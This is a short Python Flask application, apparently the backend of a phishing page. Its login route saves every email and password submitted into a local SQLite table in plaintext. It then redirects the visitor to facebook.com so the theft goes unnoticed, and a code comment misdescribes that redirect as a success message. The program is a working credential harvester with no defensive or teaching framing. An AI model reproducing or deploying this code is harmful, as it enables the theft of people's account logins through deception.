from flask import Flask, render_template, request, redirect
import sqlite3

app = Flask(__name__)

# Function to create the database table
def create_table():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, email TEXT, password TEXT)')
    conn.commit()
    conn.close()

# Function to insert user data into the database
def insert_user(email, password):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))
    conn.commit()
    conn.close()

# Function to fetch user data from the database
def get_user(email):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM users WHERE email = ?', (email,))
    user = c.fetchone()
    conn.close()
    return user

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    
    # Insert the user's credentials into the database
    insert_user(email, password)
    
    # Return a success message
    return redirect('https://www.facebook.com')

if __name__ == '__main__':
    create_table()  # Create the database table if it doesn't exist
    app.run(debug=True)
